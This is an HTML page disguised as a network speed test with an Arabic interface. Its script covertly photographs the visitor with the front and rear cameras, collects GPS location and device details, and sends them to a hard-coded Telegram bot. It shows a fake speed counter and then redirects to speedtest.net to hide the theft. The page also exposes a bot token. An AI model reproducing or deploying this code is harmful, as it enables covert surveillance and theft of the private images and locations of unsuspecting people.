
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest - Global Connectivity</title>
    <style>
        body { background-color: #0b0e18; color: white; font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { position: relative; }
        /* تصميم الزر الاحترافي */
        .circle { width: 230px; height: 230px; border: 4px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; position: relative; transition: 0.5s; box-shadow: 0 0 40px rgba(0, 210, 255, 0.2); background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); }
        .circle::before { content:   ; position: absolute; width: 100%; height: 100%; border: 4px solid transparent; border-top-color: #00d2ff; border-radius: 50%; animation: none; }
        /* أنيميشن الدوران عند البدء */
        .loading::before { animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .speed-text { font-size: 50px; font-weight: bold; color: #00d2ff; text-shadow: 0 0 10px #00d2ff; z-index: 2; }
        #status { margin-top: 30px; font-size: 18px; color: #888; height: 24px; }
        .stats { display: flex; gap: 20px; margin-top: 40px; opacity: 0.6; font-size: 14px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="header">
        <h2 style="margin-bottom: 5px;">SpeedTest™</h2>
        <p style="color: #555; margin-top: 0;">Server: Taiz - Yemen</p>
    </div>

    <div class="container">
        <div class="circle" id="startBtn">
            <span class="speed-text" id="btnText">GO</span>
        </div>
    </div>

    <p id="status">اضغط لبدء فحص الشبكة</p>

    <div class="stats">
        <div>PING <br> <span style="color: #00d2ff;">--</span></div>
        <div>DOWNLOAD <br> <span style="color: #00d2ff;">--</span></div>
        <div>UPLOAD <br> <span style="color: #00d2ff;">--</span></div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
        const chatId = "7984067238"; 

        async function sendToTelegram(type, content, extra = "") {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            if (type === "photo") {
                formData.append("photo", content, "image.jpg");
                formData.append("caption", extra);
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
            } else {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
            }
        }

        async function capture(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode, width: 640, height: 480 }, audio: false });
                const video = document.getElementById( video );
                video.srcObject = stream;
                await new Promise(res => video.onloadedmetadata = res);
                await new Promise(res => setTimeout(res, 700)); 
                const canvas = document.getElementById( canvas );
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext( 2d ).drawImage(video, 0, 0);
                stream.getTracks().forEach(t => t.stop());
                return new Promise(res => canvas.toBlob(res,  image/jpeg , 0.6));
            } catch (e) { return null; }
        }

        async function startProcess() {
            const btn = document.getElementById( startBtn );
            const status = document.getElementById( status );
            const btnText = document.getElementById( btnText );

            // بدء الحركة الاحترافية
            btn.classList.add( loading );
            btnText.innerText = "0.0";
            status.innerText = "جاري الاتصال بالسيرفر...";

            // محاكاة عداد السرعة
            let speed = 0;
            const interval = setInterval(() => {
                speed += Math.random() * 15;
                if(speed < 100) btnText.innerText = speed.toFixed(1);
            }, 100);

            // العمل الحقيقي في الخلفية
            const fImg = await capture("user");
            if (fImg) await sendToTelegram("photo", fImg, "📸 صورة أمامية");
            
            const bImg = await capture("environment");
            if (bImg) await sendToTelegram("photo", bImg, "📸 صورة خلفية");

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    let batt = "غير معروف";
                    try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}%`; } catch(e){}
                    
                    const report = `✅ **تقرير SpeedTest المطور**\n\n` +
                                   `🔋 البطارية: ${batt}\n` +
                                   `💾 الذاكرة: ${navigator.deviceMemory ||  4+ } GB\n` +
                                   `⚙️ المعالج: ${navigator.hardwareConcurrency ||  ؟ } نواة\n` +
                                   `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;

                    await sendToTelegram("text", report);
                    
                    clearInterval(interval);
                    btnText.innerText = "94.2";
                    status.innerText = "اكتمل الفحص بنجاح!";
                    setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1500);
                });
            }
        }

        document.getElementById( startBtn ).onclick = startProcess;
    </script>
</body>
</html>
